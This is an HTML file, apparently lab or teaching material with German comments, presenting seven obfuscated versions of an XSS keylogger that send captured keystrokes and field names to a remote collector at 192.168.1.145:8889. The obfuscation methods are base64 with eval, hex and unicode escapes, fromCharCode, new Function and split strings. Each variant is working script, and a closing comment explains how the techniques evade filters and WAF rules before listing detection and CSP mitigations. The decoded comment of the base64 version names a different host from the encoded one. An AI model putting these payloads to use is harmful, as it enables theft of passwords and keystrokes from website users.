<!--
XSS Keylogger - Obfuscated Version
Verschiedene Verschleierungstechniken
-->

<!-- VERSION 1: Base64-Encoded -->
<script>eval(atob('KGZ1bmN0aW9uKCkge3ZhciBzaWQgPSBNYXRoLnJhbmRvbSgpLnRvU3RyaW5nKDM2KS5zdWJzdHIoMiwgOSk7dmFyIGJ1ZiA9IFtdO3ZhciB1cmwgPSAnaHR0cDovLzEyNy4wLjAuMTo4ODg5L2xvZyc7ZG9jdW1lbnQuYWRkRXZlbnRMaXN0ZW5lcigna2V5cHJlc3MnLCBmdW5jdGlvbihlKSB7dmFyIGYgPSBlLnRhcmdldC5uYW1lIHx8IGUudGFyZ2V0LmlkIHx8ICd1bmtub3duJztidWYucHVzaCh7a2V5OiBlLmtleSwgZmllbGQ6IGZ9KTtpZiAoYnVmLmxlbmd0aCA+PSAxMCkge2ZldGNoKHVybCwge21ldGhvZDogJ1BPU1QnLCBoZWFkZXJzOiB7J0NvbnRlbnQtVHlwZSc6ICdhcHBsaWNhdGlvbi9qc29uJ30sIGJvZHk6IEpTT04uc3RyaW5naWZ5KHtrZXlzdHJva2VzOiBidWYsIHNpZDogc2lkfSl9KS5jYXRjaCgoKT0+e30pO2J1ZiA9IFtdO319KTtzZXRJbnRlcnZhbChmdW5jdGlvbigpIHtpZiAoYnVmLmxlbmd0aCA+IDApIHtmZXRjaCh1cmwsIHttZXRob2Q6ICdQT1NUJywgaGVhZGVyczogeydDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbid9LCBib2R5OiBKU09OLnN0cmluZ2lmeSh7a2V5c3Ryb2tlczogYnVmLCBzaWQ6IHNpZH0pfSkuY2F0Y2goKCk9Pnt9KTtidWYgPSBbXTt9fSwgNTAwMCk7fSkoKTs='))</script>

<!--
Decoded JavaScript:
(function() {
  var sid = Math.random().toString(36).substr(2, 9);
  var buf = [];
  var url = 'http://192.168.1.145:8889/log';
  document.addEventListener('keypress', function(e) {
    var f = e.target.name || e.target.id || 'unknown';
    buf.push({key: e.key, field: f});
    if (buf.length >= 10) {
      fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({keystrokes: buf, sid: sid})
      }).catch(()=>{});
      buf = [];
    }
  });
  setInterval(function() {
    if (buf.length > 0) {
      fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({keystrokes: buf, sid: sid})
      }).catch(()=>{});
      buf = [];
    }
  }, 5000);
})();
-->


<!-- VERSION 2: Hex-Encoded -->
<script>eval('\x28\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x29\x7b\x76\x61\x72\x20\x73\x3d\x4d\x61\x74\x68\x2e\x72\x61\x6e\x64\x6f\x6d\x28\x29\x2e\x74\x6f\x53\x74\x72\x69\x6e\x67\x28\x33\x36\x29\x2e\x73\x75\x62\x73\x74\x72\x28\x32\x2c\x39\x29\x3b\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x61\x64\x64\x45\x76\x65\x6e\x74\x4c\x69\x73\x74\x65\x6e\x65\x72\x28\x27\x6b\x65\x79\x70\x72\x65\x73\x73\x27\x2c\x66\x75\x6e\x63\x74\x69\x6f\x6e\x28\x65\x29\x7b\x66\x65\x74\x63\x68\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x34\x35\x3a\x38\x38\x38\x39\x2f\x6c\x6f\x67\x3f\x6b\x65\x79\x3d\x27\x2b\x65\x2e\x6b\x65\x79\x2b\x27\x26\x66\x69\x65\x6c\x64\x3d\x27\x2b\x28\x65\x2e\x74\x61\x72\x67\x65\x74\x2e\x6e\x61\x6d\x65\x7c\x7c\x27\x75\x27\x29\x2b\x27\x26\x73\x69\x64\x3d\x27\x2b\x73\x29\x7d\x29\x7d\x29\x28\x29')</script>


<!-- VERSION 3: String Concatenation + Char Codes -->
<script>
var a = String.fromCharCode(100,111,99,117,109,101,110,116);  // document
var b = String.fromCharCode(97,100,100,69,118,101,110,116,76,105,115,116,101,110,101,114);  // addEventListener
var c = String.fromCharCode(107,101,121,112,114,101,115,115);  // keypress
var d = String.fromCharCode(102,101,116,99,104);  // fetch
var e = 'http:' + '//' + '192.168.1.145' + ':8889' + '/log';

window[a][b](c, function(evt) {
    var k = evt.key;
    var f = evt.target.name || 'u';
    window[d](e + '?key=' + k + '&field=' + f);
});
</script>


<!-- VERSION 4: Dynamically Constructed Function -->
<script>
var code = "document.addEventListener('keypress', function(e) {" +
           "fetch('http://192.168.1.145:8889/log?key=' + e.key + '&field=' + (e.target.name || 'u'));" +
           "});";
new Function(code)();
</script>


<!-- VERSION 5: Self-Modifying Code Pattern -->
<script>
var x = 'fetch';
var y = 'http://192.168.1.145:8889/log';
document['add' + 'Event' + 'Listener']('key' + 'press', function(e) {
    window[x](y + '?' + 'key=' + e['k' + 'ey'] + '&field=' + (e['tar' + 'get']['na' + 'me'] || 'u'));
});
</script>


<!-- VERSION 6: Comment Breaking -->
<script>
var sid = Math.random/*comment*/.toString(36).substr(2, 9);
document/*
*/.addEventListener/*
*/('keypress'/*
*/, function(e) {
    fetch/*
    */('http://192.168.1.145:8889/log?key=' + e.key + '&sid=' + sid);
});
</script>


<!-- VERSION 7: Unicode Escape Sequences -->
<script>
\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074.\u0061\u0064\u0064\u0045\u0076\u0065\u006e\u0074\u004c\u0069\u0073\u0074\u0065\u006e\u0065\u0072('\u006b\u0065\u0079\u0070\u0072\u0065\u0073\u0073', function(e) {
    fetch('http://192.168.1.145:8889/log?key=' + e.key);
});
</script>

<!--
Obfuscation-Techniken erklärt:

1. BASE64 ENCODING
   - atob() dekodiert Base64
   - eval() führt dekodierten Code aus
   - Umgeht einfache String-basierte Filter

2. HEX ENCODING (\x)
   - Jedes Zeichen als Hex-Wert
   - Schwer lesbar für Menschen
   - Wird von JavaScript automatisch dekodiert

3. STRING FROMCHARCODE
   - Konstruiert Strings aus ASCII-Codes
   - Keine sichtbaren Keywords wie "fetch" oder "addEventListener"
   - Umgeht Keyword-basierte WAF-Rules

4. DYNAMIC FUNCTION CONSTRUCTION
   - Code als String speichern
   - new Function() erstellt Funktion dynamisch
   - Ähnlich zu eval() aber scope-isolated

5. STRING CONCATENATION
   - Keywords in Teile aufteilen: 'add' + 'Event' + 'Listener'
   - Umgeht statische String-Suche
   - Property access via strings: obj['prop']

6. COMMENT BREAKING
   - JavaScript-Kommentare /* */ zwischen Code
   - Schwerer zu parsen für Tools
   - Code bleibt funktionsfähig

7. UNICODE ESCAPING (\u)
   - Jedes Zeichen als Unicode-Escape
   - Äquivalent zu Hex aber Unicode
   - Wird automatisch dekodiert

Advanced Tools:
- JSFuck (http://www.jsfuck.com) - Code mit nur []()!+
- JJencode - Japanese Text Encoding
- AAencode - Emoji/ASCII Art Encoding

Detection:
- eval(), atob(), Function() constructor → Suspicious
- Excessive obfuscation → Red Flag
- High entropy strings → Potential encoding
- Behavior analysis > Static analysis

Mitigation:
- Content Security Policy (CSP): unsafe-eval blocked
- No eval() or new Function() allowed
- Code Review für minified/obfuscated code
- Runtime monitoring for suspicious behavior
-->
